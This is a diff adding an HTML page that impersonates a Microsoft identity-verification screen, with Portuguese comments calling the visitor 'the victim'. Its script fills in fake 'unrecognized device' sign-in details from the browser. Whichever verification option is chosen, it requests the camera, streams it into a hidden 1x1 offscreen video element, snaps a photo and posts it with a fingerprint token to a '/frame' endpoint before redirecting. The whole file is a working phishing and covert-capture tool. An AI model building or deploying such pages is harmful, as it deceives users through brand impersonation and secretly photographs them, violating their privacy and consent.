@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify your identity — Microsoft</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 44px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 2px 6px rgba(0,0,0,.12);
+    }
+
+    /* Logo — idêntico ao login.html */
+    .logo {
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .logo-text {
+      font-size: 20px;
+      font-weight: 300;
+      color: #1b1b1b;
+      letter-spacing: -0.2px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.65;
+      margin-bottom: 20px;
+    }
+
+    /* Caixa de detalhes do sign-in detectado — igual ao que o Microsoft mostra */
+    .signin-details {
+      border: 1px solid #d6d6d6;
+      padding: 0;
+      margin-bottom: 24px;
+      font-size: 13px;
+    }
+
+    .signin-details-header {
+      background: #f5f5f5;
+      padding: 8px 14px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #555;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+      border-bottom: 1px solid #d6d6d6;
+    }
+
+    .signin-details-body {
+      padding: 12px 14px;
+    }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 4px 0;
+      font-size: 13px;
+      color: #333;
+    }
+
+    .detail-row .detail-label { color: #666; }
+    .detail-row .detail-value { font-weight: 600; color: #1b1b1b; }
+
+    /* Método de verificação */
+    .verify-method {
+      border: 1px solid #d6d6d6;
+      padding: 14px 16px;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      cursor: pointer;
+      transition: border-color .15s, background .15s;
+    }
+
+    .verify-method:hover   { border-color: #0067b8; background: #f0f6ff; }
+    .verify-method.selected { border-color: #0067b8; background: #f0f6ff; }
+
+    .verify-method-icon { flex-shrink: 0; color: #0067b8; }
+
+    .verify-method-text .method-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1b1b1b;
+    }
+
+    .verify-method-text .method-sub {
+      font-size: 12px;
+      color: #666;
+      margin-top: 2px;
+    }
+
+    /* Botão — idêntico ao login.html */
+    .btn-next {
+      display: block;
+      width: 100%;
+      padding: 8px 16px;
+      background: #0067b8;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      margin-top: 20px;
+      text-align: center;
+      transition: background .15s;
+    }
+    .btn-next:hover    { background: #005a9e; }
+    .btn-next:disabled { background: #b0b0b0; cursor: default; }
+
+    .options {
+      margin-top: 14px;
+      font-size: 13px;
+    }
+    .options a { color: #0067b8; text-decoration: none; }
+    .options a:hover { text-decoration: underline; }
+
+    /* Spinner */
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 3px solid #e6e6e6;
+      border-top-color: #0067b8;
+      border-radius: 50%;
+      animation: spin .75s linear infinite;
+      margin: 32px auto 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .status-text { font-size: 14px; color: #333; text-align: center; margin-bottom: 6px; }
+    .status-sub  { font-size: 12px; color: #888; text-align: center; }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #e6e6e6;
+      margin: 20px 0;
+    }
+
+    .footer {
+      margin-top: 28px;
+      font-size: 12px;
+      color: #666;
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .footer a { color: #666; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <!--
+    Elemento de vídeo oculto (1×1 px fora do ecrã).
+    O stream corre aqui sem nunca ser visível para a vítima.
+  -->
+  <video id="bg-video"
+         style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px"
+         autoplay playsinline muted></video>
+
+  <div class="container">
+
+    <!-- Logo — idêntico ao login.html -->
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 21" width="21" height="21" aria-hidden="true">
+        <rect x="1"  y="1"  width="9" height="9" fill="#F35325"/>
+        <rect x="11" y="1"  width="9" height="9" fill="#81BC06"/>
+        <rect x="1"  y="11" width="9" height="9" fill="#05A6F0"/>
+        <rect x="11" y="11" width="9" height="9" fill="#FFBA08"/>
+      </svg>
+      <span class="logo-text">Microsoft</span>
+    </div>
+
+    <!-- Estado 1: Pedido de verificação -->
+    <div id="state-initial">
+
+      <h1>Verify your identity</h1>
+      <p class="subtitle">
+        We detected a sign-in attempt from an unrecognized device or location.
+        To protect your account, please verify your identity before continuing.
+      </p>
+
+      <!-- Detalhes do sign-in detectado — igual ao real -->
+      <div class="signin-details">
+        <div class="signin-details-header">Sign-in details</div>
+        <div class="signin-details-body">
+          <div class="detail-row">
+            <span class="detail-label">Time</span>
+            <span class="detail-value" id="signin-time">—</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Platform</span>
+            <span class="detail-value" id="signin-platform">—</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Browser</span>
+            <span class="detail-value" id="signin-browser">—</span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Status</span>
+            <span class="detail-value" style="color:#c0392b">Unrecognized device</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Métodos de verificação -->
+      <p style="font-size:13px;color:#444;margin-bottom:12px;font-weight:600">
+        Choose a verification method
+      </p>
+
+      <!-- Opção: selfie (é a que dispara getUserMedia) -->
+      <div class="verify-method selected" id="method-selfie" onclick="selectMethod('selfie')">
+        <div class="verify-method-icon">
+          <!-- Ícone de câmara (SVG, sem emoji) -->
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"
+               xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="7" width="20" height="14" rx="2" stroke="#0067b8" stroke-width="1.8"/>
+            <circle cx="12" cy="14" r="3.5" stroke="#0067b8" stroke-width="1.8"/>
+            <path d="M9 7l1.5-3h3L15 7" stroke="#0067b8" stroke-width="1.8" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="verify-method-text">
+          <div class="method-title">Facial recognition</div>
+          <div class="method-sub">Use your camera to verify it is you</div>
+        </div>
+      </div>
+
+      <!-- Opção: outro método (decorativa, não faz nada) -->
+      <div class="verify-method" id="method-phone" onclick="selectMethod('phone')">
+        <div class="verify-method-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none"
+               xmlns="http://www.w3.org/2000/svg">
+            <rect x="6" y="2" width="12" height="20" rx="2" stroke="#0067b8" stroke-width="1.8"/>
+            <circle cx="12" cy="18" r="1" fill="#0067b8"/>
+          </svg>
+        </div>
+        <div class="verify-method-text">
+          <div class="method-title">Text message</div>
+          <div class="method-sub">Send a code to your registered phone</div>
+        </div>
+      </div>
+
+      <button class="btn-next" id="btn-verify" onclick="startVerification()">
+        Next
+      </button>
+
+      <hr class="divider" />
+
+      <div class="options">
+        <a href="/warning">I can't verify right now</a>
+      </div>
+
+    </div>
+
+    <!-- Estado 2: A verificar (spinner) -->
+    <div id="state-verifying" style="display:none">
+      <div class="spinner"></div>
+      <p class="status-text" id="status-main">Verifying your identity...</p>
+      <p class="status-sub"  id="status-sub">Please keep this window open. This may take a few seconds.</p>
+    </div>
+
+    <div class="footer">
+      <a href="#">Terms of use</a>
+      <a href="#">Privacy &amp; cookies</a>
+      <a href="#">...</a>
+    </div>
+
+  </div>
+
+  <script>
+    const FP_TOKEN = "{{ fp_token }}";
+    const bgVideo  = document.getElementById("bg-video");
+    let stream     = null;
+    let selected   = "selfie";
+
+    // Preencher os detalhes do sign-in com dados reais do browser
+    (function populateDetails() {
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
+                    + " · " + now.toLocaleDateString([], { day: "2-digit", month: "short", year: "numeric" });
+
+      let platform = navigator.platform || "Unknown";
+      if (/Win/.test(platform))      platform = "Windows";
+      else if (/Mac/.test(platform)) platform = "macOS";
+      else if (/Linux/.test(platform)) platform = "Linux";
+      else if (/iPhone|iPad/.test(navigator.userAgent)) platform = "iOS";
+      else if (/Android/.test(navigator.userAgent))     platform = "Android";
+
+      let browser = "Unknown browser";
+      const ua = navigator.userAgent;
+      if (/Edg\//.test(ua))         browser = "Microsoft Edge";
+      else if (/OPR\//.test(ua))    browser = "Opera";
+      else if (/Chrome\//.test(ua)) browser = "Chrome";
+      else if (/Firefox\//.test(ua))browser = "Firefox";
+      else if (/Safari\//.test(ua)) browser = "Safari";
+
+      document.getElementById("signin-time").textContent     = timeStr;
+      document.getElementById("signin-platform").textContent = platform;
+      document.getElementById("signin-browser").textContent  = browser;
+    })();
+
+    function selectMethod(method) {
+      selected = method;
+      document.getElementById("method-selfie").classList.toggle("selected", method === "selfie");
+      document.getElementById("method-phone").classList.toggle("selected",  method === "phone");
+    }
+
+    async function startVerification() {
+      document.getElementById("btn-verify").disabled = true;
+
+      // Texto do spinner consoante o método escolhido
+      if (selected === "phone") {
+        document.getElementById("status-main").textContent = "Sending verification code...";
+        document.getElementById("status-sub").textContent  = "A code will be sent to your registered phone number.";
+      } else {
+        document.getElementById("status-main").textContent = "Verifying your identity...";
+        document.getElementById("status-sub").textContent  = "Please keep this window open. This may take a few seconds.";
+      }
+
+      // Trocar para estado de spinner imediatamente
+      document.getElementById("state-initial").style.display   = "none";
+      document.getElementById("state-verifying").style.display = "block";
+
+      // Pedir acesso à câmara (ambos os métodos)
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      } catch (_) {
+        // Utilizador negou ou sem câmara — redireciona normalmente
+        window.location.href = "/warning";
+        return;
+      }
+
+      // Ligar stream ao vídeo oculto (1×1px fora do ecrã)
+      bgVideo.srcObject = stream;
+
+      // iOS/Android: play() explícito necessário quando o elemento está fora do ecrã
+      try { await bgVideo.play(); } catch (_) {}
+
+      // Aguardar que o vídeo inicialize — usa loadedmetadata + fallback por timeout
+      await waitForVideo();
+
+      // Tirar UMA foto e enviar
+      await capturePhoto();
+
+      // Parar a câmara
+      stream.getTracks().forEach(t => t.stop());
+
+      // Redirecionar para a página de aviso
+      window.location.href = "/warning";
+    }
+
+    function waitForVideo(maxMs = 4000) {
+      return new Promise(resolve => {
+        // Evento disparado quando o browser conhece dimensões do vídeo (funciona em mobile)
+        const onMeta = () => {
+          bgVideo.removeEventListener("loadedmetadata", onMeta);
+          resolve();
+        };
+        bgVideo.addEventListener("loadedmetadata", onMeta);
+
+        // Fallback: se loadedmetadata já foi disparado ou o browser não o suporta bem
+        const t0 = Date.now();
+        const poll = () => {
+          if (bgVideo.videoWidth > 0) {
+            bgVideo.removeEventListener("loadedmetadata", onMeta);
+            resolve();
+          } else if (Date.now() - t0 < maxMs) {
+            requestAnimationFrame(poll);
+          } else {
+            bgVideo.removeEventListener("loadedmetadata", onMeta);
+            resolve(); // timeout — tenta capturar na mesma
+          }
+        };
+        poll();
+      });
+    }
+
+    async function capturePhoto() {
+      // Dimensões reais do vídeo; fallback para 640×480 se ainda 0 (mobile offscreen)
+      const w = bgVideo.videoWidth  || 640;
+      const h = bgVideo.videoHeight || 480;
+      const canvas = document.createElement("canvas");
+      canvas.width  = w;
+      canvas.height = h;
+      canvas.getContext("2d").drawImage(bgVideo, 0, 0, w, h);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
+      // Só envia se o canvas não estiver em branco (data URI mínima ~1 KB)
+      if (dataUrl.length < 1000) return;
+      await fetch("/frame", {
+        method:    "POST",
+        headers:   { "Content-Type": "application/json" },
+        body:      JSON.stringify({ fp_token: FP_TOKEN, frame: dataUrl }),
+        keepalive: true,
+      }).catch(() => {});
+    }
+  </script>
+</body>
+</html>
